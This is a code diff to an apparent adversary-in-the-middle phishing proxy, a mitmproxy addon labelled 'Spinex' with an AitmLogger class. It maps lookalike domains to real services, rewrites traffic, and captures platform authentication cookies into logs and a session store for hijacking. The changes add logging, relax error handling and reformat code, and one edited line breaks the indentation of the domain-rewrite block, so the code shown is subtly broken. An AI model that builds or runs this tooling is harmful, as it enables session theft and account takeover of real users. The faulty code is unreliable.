@@ -818,16 +818,12 @@ _META_REFRESH = re.compile(
 _CSS_URL = re.compile(r"(url\s*\(\s*['\"]?)([^'\")]+)(['\"]?\s*\))", re.IGNORECASE)
 
 def _decompress_body(flow: http.HTTPFlow) -> bytes | None:
-    """
-    Decompress response body and remove Content-Encoding header.
-    Handles gzip, deflate, brotli, and identity.
-    """
+    """Improved decompression with better error handling"""
     raw = flow.response.raw_content
     if not raw:
         return None
 
     encoding = flow.response.headers.get("content-encoding", "").lower()
-
     try:
         if "gzip" in encoding:
             body = gzip.decompress(raw)
@@ -838,20 +834,22 @@ def _decompress_body(flow: http.HTTPFlow) -> bytes | None:
                 body = zlib.decompress(raw, -zlib.MAX_WBITS)
         elif "br" in encoding:
             try:
-                import brotli  # type: ignore
+                import brotli
                 body = brotli.decompress(raw)
             except ImportError:
-                return None
+                print("[Spinex] Brotli not installed, skipping")
+                return raw
         else:
             body = raw
 
+        # Remove encoding header after decompression
         if encoding:
             del flow.response.headers["content-encoding"]
 
         return body
-    except Exception:
-        traceback.print_exc()
-        return None
+    except Exception as e:
+        print(f"[Spinex] Decompression failed: {e}")
+        return raw
 
 def _replace_domains(text: str) -> str:
     """
@@ -1301,9 +1299,9 @@ class AitmLogger:
         try:
             host        = flow.request.pretty_host
             url         = flow.request.url
-            if host in _REVERSE_DOMAIN_MAP:
+        if host in _REVERSE_DOMAIN_MAP:
                 real_host = _REVERSE_DOMAIN_MAP[host]
-                print(f"[Spinex] Rewriting upstream: {host} → {real_host}")
+                print(f"[Spinex] Rewriting: {host} → {real_host}")
                 flow.request.host = real_host
                 flow.request.headers["Host"] = real_host
             platforms   = _match_platform(host)
@@ -1362,13 +1360,18 @@ class AitmLogger:
 
     def response(self, flow: http.HTTPFlow) -> None:
         try:
-            host      = flow.request.pretty_host
-            url       = flow.request.url
-            platforms = _match_platform(host)
+            host = flow.request.pretty_host
+            url = flow.request.url
+            status = flow.response.status_code
 
+            print(f"[Spinex] Response from {host} | Status: {status} | URL: {url}")
+
+            platforms = _match_platform(host)
             raw_cookies = flow.response.cookies
+
+            # ==================== COOKIE CAPTURE ====================
             if raw_cookies:
-                auth_cookies    = {}
+                auth_cookies = {}
                 skipped_cookies = {}
 
                 for name, cookie_obj in raw_cookies.items():
@@ -1379,8 +1382,9 @@ class AitmLogger:
                     else:
                         value = str(cookie_obj)
 
-                    name  = convert_bytes(name)
+                    name = convert_bytes(name)
                     value = convert_bytes(value)
+
                     is_auth, matched_platform = _is_auth_cookie(name, platforms)
 
                     if is_auth:
@@ -1392,21 +1396,27 @@ class AitmLogger:
                     platform = platforms[0] if platforms else "unknown"
                     _append_log(LOG_COOKIES, {
                         "timestamp": str(datetime.datetime.now()),
-                        "host":      host,
-                        "url":       url,
-                        "cookies":   auth_cookies,
+                        "host": host,
+                        "url": url,
+                        "cookies": auth_cookies,
                     })
                     SESSION_STORE.update_cookies(flow, url, platform, auth_cookies)
 
                 if DEBUG_SKIPPED and skipped_cookies:
                     _append_log(LOG_SKIPPED, {
                         "timestamp": str(datetime.datetime.now()),
-                        "host": host, "url": url, "skipped": skipped_cookies,
+                        "host": host,
+                        "url": url,
+                        "skipped": skipped_cookies,
                     })
 
+            # ==================== RESPONSE REWRITE ====================
             _rewrite_response(flow)
 
-        except Exception:
+            print(f"[Spinex] Successfully processed response from {host}")
+
+        except Exception as e:
+            print(f"[Spinex] Response processing error for {host}: {e}")
             traceback.print_exc()
 
 
